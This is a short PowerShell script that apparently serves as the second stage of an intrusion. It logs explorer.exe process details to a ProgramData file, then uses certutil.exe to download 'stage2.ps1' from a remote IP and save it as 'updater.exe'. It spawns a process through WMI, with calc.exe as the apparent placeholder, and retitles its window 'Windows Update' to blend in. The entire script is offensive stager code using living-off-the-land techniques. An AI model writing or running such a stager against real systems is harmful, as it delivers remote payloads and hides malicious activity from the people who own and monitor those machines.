[CmdletBinding()]
param(
    [string]$EndpointUrl = "http://203.0.113.184/stage2.ps1",
    [string]$PayloadPath = 'C:\ProgramData\updater.exe',
    [int]$TimeoutSec = 14
)
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File 'C:\ProgramData\telemetry.json' -Append
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $TransferResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-Verbose ("Process ID: " + $TransferResult.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 2 reached"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$Host.UI.RawUI.WindowTitle = "Windows Update"
